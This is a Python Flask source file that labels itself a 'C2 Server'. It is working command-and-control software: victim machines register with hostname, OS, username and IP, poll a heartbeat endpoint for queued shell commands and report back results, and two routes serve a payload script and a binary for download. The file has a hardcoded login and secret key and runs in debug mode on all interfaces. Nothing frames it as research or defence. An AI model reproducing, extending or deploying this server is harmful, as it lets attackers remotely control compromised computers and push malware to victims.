from flask import Flask, render_template, request, jsonify, redirect, url_for , session , send_file
import uuid
import datetime
import json
import os
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = 'lowkeytopsecret' 
# Ensure the data directory exists
if not os.path.exists('data'):
    os.makedirs('data')

# Store client connections
clients = {}

VALID_USERNAME = 'lowkey'
VALID_PASSWORD = 'ngomma'


@app.route('/dl')
def serve_payload():
    return send_file("shit/payload.sh", mimetype="text/plain")

@app.route('/lev')
def down():
    return send_file("shit/levy",as_attachment=True)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == VALID_USERNAME and password == VALID_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            return "Invalid creds bro", 403
    return render_template('login.html')


@app.route('/')
def dashboard():
    # Update client statuses - mark clients as offline if no update in last 30 seconds
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    current_time = datetime.datetime.now()
    for client_id in list(clients.keys()):
        last_seen = datetime.datetime.fromisoformat(clients[client_id]['last_seen'])
        if (current_time - last_seen).total_seconds() > 30:
            clients[client_id]['status'] = 'Offline'
    
    return render_template('dashboard.html', clients=clients)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/client/<client_id>')
def client_terminal(client_id):
    if client_id not in clients:
        return redirect(url_for('dashboard'))
    
    return render_template('terminal.html', client=clients[client_id])

@app.route('/api/register', methods=['POST'])
def register_client():
    data = request.json
    hostname = data.get('hostname', 'Unknown')
    os_info = data.get('os_info', 'Unknown')
    username = data.get('username', 'Unknown')
    ip_address = request.remote_addr
    
    # Generate a unique ID for the client
    client_id = str(uuid.uuid4())
    
    # Store client information
    clients[client_id] = {
        'id': client_id,
        'hostname': hostname,
        'os_info': os_info,
        'username': username,
        'ip_address': ip_address,
        'status': 'Online',
        'last_seen': datetime.datetime.now().isoformat(),
        'pending_commands': [],
        'command_results': []
    }
    
    # Save client data to disk for persistence
    with open(f'data/{client_id}.json', 'w') as f:
        json.dump(clients[client_id], f)
    
    logger.info(f"New client registered: {hostname} ({client_id})")
    return jsonify({'client_id': client_id})

@app.route('/api/heartbeat/<client_id>', methods=['POST'])
def heartbeat(client_id):
    if client_id in clients:
        clients[client_id]['status'] = 'Online'
        clients[client_id]['last_seen'] = datetime.datetime.now().isoformat()
        
        # Return any pending commands
        commands = clients[client_id]['pending_commands'].copy()  # Create a copy
        
        logger.info(f"Heartbeat from client {client_id}, sending {len(commands)} commands")
        return jsonify({'status': 'ok', 'commands': commands})
    
    logger.warning(f"Heartbeat received from unknown client: {client_id}")
    return jsonify({'status': 'error', 'message': 'Client not found'})

@app.route('/api/send_command/<client_id>', methods=['POST'])
def send_command(client_id):
    if client_id not in clients:
        logger.warning(f"Attempt to send command to unknown client: {client_id}")
        return jsonify({'status': 'error', 'message': 'Client not found'})
    
    command = request.json.get('command')
    if not command:
        return jsonify({'status': 'error', 'message': 'No command provided'})
    
    # Add command to pending commands
    command_id = str(uuid.uuid4())
    timestamp = datetime.datetime.now().isoformat()
    
    command_data = {
        'id': command_id,
        'command': command,
        'timestamp': timestamp,
        'status': 'pending'
    }
    
    clients[client_id]['pending_commands'].append(command_data)
    
    # Update client data file
    with open(f'data/{client_id}.json', 'w') as f:
        json.dump(clients[client_id], f)
    
    logger.info(f"Command sent to client {client_id}: {command} (ID: {command_id})")
    return jsonify({'status': 'ok', 'command_id': command_id})

@app.route('/api/command_result/<client_id>', methods=['POST'])
def command_result(client_id):
    if client_id not in clients:
        logger.warning(f"Command result received from unknown client: {client_id}")
        return jsonify({'status': 'error', 'message': 'Client not found'})
    
    data = request.json
    command_id = data.get('command_id')
    result = data.get('result')
    
    logger.info(f"Received result for command {command_id} from client {client_id}")
    
    # Check if the command exists in pending commands
    found = False
    command_data = None
    
    # Find and remove the command from pending commands
    for i, cmd in enumerate(clients[client_id]['pending_commands']):
        if cmd['id'] == command_id:
            command_data = clients[client_id]['pending_commands'].pop(i)
            found = True
            break
    
    if found:
        # Update the command with the result and add to results
        command_data['status'] = 'completed'
        command_data['result'] = result
        clients[client_id]['command_results'].append(command_data)
        logger.info(f"Command {command_id} marked as completed")
    else:
        # If not found in pending, create a new entry or check existing results
        existing_result = None
        for res in clients[client_id]['command_results']:
            if res['id'] == command_id:
                existing_result = res
                break
        
        if existing_result:
            # Update existing result
            existing_result['result'] = result
            logger.info(f"Updated existing result for command {command_id}")
        else:
            # Create new result entry
            logger.info(f"Creating new result entry for command {command_id}")
            cmd = {
                'id': command_id,
                'command': 'Unknown (received result only)',
                'timestamp': datetime.datetime.now().isoformat(),
                'status': 'completed',
                'result': result
            }
            clients[client_id]['command_results'].append(cmd)
    
    # Update client data file
    with open(f'data/{client_id}.json', 'w') as f:
        json.dump(clients[client_id], f)
    
    return jsonify({'status': 'ok'})

@app.route('/api/get_results/<client_id>', methods=['GET'])
def get_results(client_id):
    if client_id not in clients:
        logger.warning(f"Results requested for unknown client: {client_id}")
        return jsonify({'status': 'error', 'message': 'Client not found'})
    
    # Include both pending commands and results for better tracking
    all_commands = clients[client_id]['command_results'].copy()
    
    # Add pending commands with "pending" status
    for cmd in clients[client_id]['pending_commands']:
        pending_cmd = cmd.copy()
        if 'result' not in pending_cmd:
            pending_cmd['result'] = 'Waiting for response...'
        all_commands.append(pending_cmd)
    
    logger.info(f"Sending {len(all_commands)} results for client {client_id}")
    return jsonify({
        'status': 'ok',
        'results': all_commands
    })

@app.route('/api/clear_results/<client_id>', methods=['POST'])
def clear_results(client_id):
    if client_id not in clients:
        return jsonify({'status': 'error', 'message': 'Client not found'})
    
    clients[client_id]['command_results'] = []
    
    # Update client data file
    with open(f'data/{client_id}.json', 'w') as f:
        json.dump(clients[client_id], f)
    
    return jsonify({'status': 'ok'})

# Load existing clients from disk on startup
def load_clients():
    if os.path.exists('data'):
        for filename in os.listdir('data'):
            if filename.endswith('.json'):
                try:
                    with open(f'data/{filename}', 'r') as f:
                        client_data = json.load(f)
                        client_id = client_data['id']
                        clients[client_id] = client_data
                        # Mark as offline on startup
                        clients[client_id]['status'] = 'Offline'
                        logger.info(f"Loaded client from disk: {client_data['hostname']} ({client_id})")
                except Exception as e:
                    logger.error(f"Error loading client data from {filename}: {e}")

# Load existing clients on startup
load_clients()

if __name__ == '__main__':
    logger.info("C2 Server starting on port 5000")
    app.run(host='0.0.0.0', port=5000, debug=True)
